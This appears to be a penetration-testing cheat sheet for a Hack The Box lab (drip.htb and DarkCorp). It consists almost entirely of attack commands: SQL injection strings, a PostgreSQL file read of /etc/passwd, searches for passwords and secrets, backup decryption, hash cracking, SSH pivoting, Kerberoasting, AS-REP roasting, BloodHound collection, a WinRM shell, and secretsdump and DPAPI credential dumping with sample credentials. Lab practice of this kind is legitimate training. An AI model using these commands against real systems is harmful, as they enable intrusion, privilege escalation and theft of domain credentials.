# Minimal manual probe (non-malicious) to test HTML rendering
```sh
curl -X POST http://drip.htb/contact \
  --data-urlencode 'message=<b>test</b>' \
  -d 'name=a&email=a@drip.htb&content=html&recipient=support@drip.htb'
```

# In a textbox / URL param (tested via Burp/Repeater), try:

```sql
' OR 1=1--
" OR 1=1--
"; SELECT version();--
""; SELECT current_database();--
```

# PostgreSQL read-file via large objects (LO) on vulnerable backends:

```sql
''; SELECT lo_import('/etc/passwd');--
''; SELECT encode(lo_get(<OID>), 'escape');--
```

# Local Linux post-ex

## Quick situational awareness

```sh
id; hostnamectl; ip a; ss -tulpn
ls -al /var/backups /etc /home
grep -R "password\|passwd\|SECRET\|PGPASSWORD" / -n --exclude-dir={proc,sys,dev} 2>/dev/null
```

## GPG-protected backups (as in DarkCorp)

```sh
gpg --list-keys
gpg --decrypt /var/backups/postgres/dev-dripmail.old.sql.gpg > /tmp/dev.sql
```

## Crack hashes with John/Hashcat

```sh
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

or

```sh
hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Local port-forward (access internal web from Kali via 127.0.0.1:8080)

```sh
ssh -L 127.0.0.1:8080:172.16.20.2:80 user@drip.htb
```

## Dynamic SOCKS proxy (browse with FoxyProxy)

```sh
ssh -D 1080 user@drip.htb
```

# SMB / shares

```sh
smbclient -L \\172.16.20.2\ -U 'DARKCORP\victor.r%Passw0rd!'
```

# Basic RPC

```sh
rpcclient -U '' -N 172.16.20.1 -c 'enumdomusers'
```

# Kerberos roasting (requires a domain user)

```sh
impacket-GetUserSPNs -request -dc-ip 172.16.20.1 DARKCORP/victor.r:Passw0rd!
```

# ASREP roasting (no preauth users—if you have a user list)

```sh
impacket-GetNPUsers -dc-ip 172.16.20.1 DARKCORP/ -usersfile users.txt -format hashcat -no-pass
```

# BloodHound collection (Community Edition allowed)

```sh
bloodhound-python -d darkcorp.htb -u victor.r -p 'Passw0rd!' -ns 172.16.20.1 -c All --zip
```

# WinRM shell (great OSCP staple)

```sh
evil-winrm -i 172.16.20.2 -u victor.r -p 'Passw0rd!'
```

# Local Windows info

```cmd
whoami /all
systeminfo
ipconfig /all
net user /domain
net group "Domain Admins" /domain
dir \\dc-01\SYSVOL
```

# Windows: quick checks (bring your copies)

```cmd
.\winPEASany.exe
```

# Manual checks

```cmd
wmic qfe list brief
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
icacls C:\ /inheritance:e /t
```

# Linux

```sh
find / -perm -4000 -type f 2>/dev/null
sudo -l
getcap -r / 2>/dev/null
```

# Impacket dump (with Admin/SYSTEM)

```sh
impacket-secretsdump -dc-ip 172.16.20.1 DARKCORP/Administrator:'Adm!nPass'@172.16.20.2
```

# DPAPI (advanced but permitted tooling)

```sh
donpapi 172.16.20.2 -u Administrator -p 'Adm!nPass'
```

# Crack NTLM hashes

```sh
hashcat -m 1000 ntlmhashes.txt /usr/share/wordlists/rockyou.txt
```
